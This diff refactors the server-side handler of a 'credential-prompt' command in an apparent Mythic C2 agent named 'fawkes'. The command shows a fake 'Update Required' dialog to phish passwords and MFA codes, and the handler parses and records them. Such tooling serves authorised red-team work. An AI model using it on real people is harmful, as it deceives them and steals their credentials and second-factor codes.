@@ -9,6 +9,29 @@ import (
 	"github.com/MythicMeta/MythicContainer/mythicrpc"
 )
 
+func parseCredentialPromptResponse(responseText string) (username, credential, credType string) {
+	for _, line := range strings.Split(responseText, "\n") {
+		trimmed := strings.TrimSpace(line)
+		if strings.HasPrefix(trimmed, "User:") {
+			username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
+		} else if strings.HasPrefix(trimmed, "Password:") {
+			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+			credType = "dialog"
+		} else if strings.HasPrefix(trimmed, "Code:") {
+			credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Code:"))
+			credType = "mfa-phish"
+		}
+	}
+	return
+}
+
+func credentialPromptDefaultTitle(title string) string {
+	if title == "" {
+		return "Update Required"
+	}
+	return title
+}
+
 func init() {
 	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
 		Name:                "credential-prompt",
@@ -148,9 +171,7 @@ func init() {
 				TaskID:  taskData.Task.ID,
 			}
 			title, _ := taskData.Args.GetStringArg("title")
-			if title == "" {
-				title = "Update Required"
-			}
+			title = credentialPromptDefaultTitle(title)
 			display := fmt.Sprintf("title: %s", title)
 			response.DisplayParams = &display
 			createArtifact(taskData.Task.ID, "User Interaction", fmt.Sprintf("GUI credential prompt: %s", title))
@@ -165,23 +186,7 @@ func init() {
 			if !ok || responseText == "" {
 				return response
 			}
-			// Parse output format:
-			//   User:     <username>
-			//   Password: <password>      (dialog mode)
-			//   Code:     <code>          (mfa-phish mode)
-			var username, credential, credType string
-			for _, line := range strings.Split(responseText, "\n") {
-				trimmed := strings.TrimSpace(line)
-				if strings.HasPrefix(trimmed, "User:") {
-					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
-				} else if strings.HasPrefix(trimmed, "Password:") {
-					credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
-					credType = "dialog"
-				} else if strings.HasPrefix(trimmed, "Code:") {
-					credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Code:"))
-					credType = "mfa-phish"
-				}
-			}
+			username, credential, credType := parseCredentialPromptResponse(responseText)
 			if username != "" && credential != "" {
 				comment := "credential-prompt dialog capture"
 				realm := "local"
